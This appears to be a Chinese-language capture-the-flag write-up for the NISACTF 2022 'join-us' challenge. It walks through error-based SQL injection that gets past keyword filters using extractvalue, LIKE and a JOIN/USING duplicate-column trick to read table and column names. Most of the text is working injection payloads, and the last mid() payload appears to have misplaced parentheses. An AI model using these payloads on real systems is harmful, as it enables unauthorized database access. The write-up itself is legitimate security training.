# [NISACTF 2022]join-us（绕database，无列名注入）

拿到题目，sql注入的漏洞点很好找

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed@main/20251209223056.png)

先fuzz一下，

被过滤的有：& =  " and union by database column updatexml



### 绕过database()

发现过滤了database，那我们想得到数据库名该怎么绕过呢？这里可以通过报错来实现

可以用数据库中**不存在的表名**或者**不存在的自定义函数名**爆出数据库名，`1'-a()#` 或 `1' || (select * from aa)#`

得到了数据库名：sqlsql

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed@main/20251210184248.png)



### 报错注入+无列名注入

由于updatexml被过滤了这里用extractvalue

由于=被绕过可以用like函数绕过

爆表名：1' || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like 'sqlsql')))#

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed@main/20251210184920.png)

得到表名之后要爆字段名，但是这里column也被过滤了，题目也提示join，所以想到**无列名注入**

*join是把两张表的列名相加，就导致有可能会产生相同的表名，但是jion不允许合并的两个表中有相同的列名，因此通过**报错**得到列名*

```
select * from (select * from users as a join users as b) as c
```



| 层级       | 代码片段                                   | 作用说明                                                     |
| ---------- | ------------------------------------------ | ------------------------------------------------------------ |
| 内层子查询 | `select * from users as a join users as b` | 对 `users` 表做**自连接**（自己和自己连接），`a`/`b` 是 `users` 表的别名，用于区分两次引用的同一张表 |
| 中层包装   | `(...) as c`                               | 把内层自连接的结果集命名为别名 `c`（MySQL 要求子查询必须有别名） |
| 外层查询   | `select * from ...`                        | 读取中层结果集 `c` 的所有字段                                |

了解了join无列名报错注入就可以接着解题了

payload：1'||extractvalue(1,concat(0x7e,(select * from(select * from output as a join output as b)as c)))#

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed@main/20251210194859.png)

然后：1'||extractvalue(1,concat(0x7e,(select * from(select * from output as a join output as b using(data))as c)))#

1'||extractvalue(1,concat(0x7e,mid((select * from(select * from output as a join output as b using(data))as c)),15,30)#

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed@main/20251210195557.png)

结束。





using表示使用什么字段进行连接，用using指定了连接字段则查询结果只返回连接字段，所以就不会出现再报错信息中，转而报错的是后续有重复的列名。

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed@main/20251210195911.png)

参考：https://www.cnblogs.com/q1stop/p/18024992
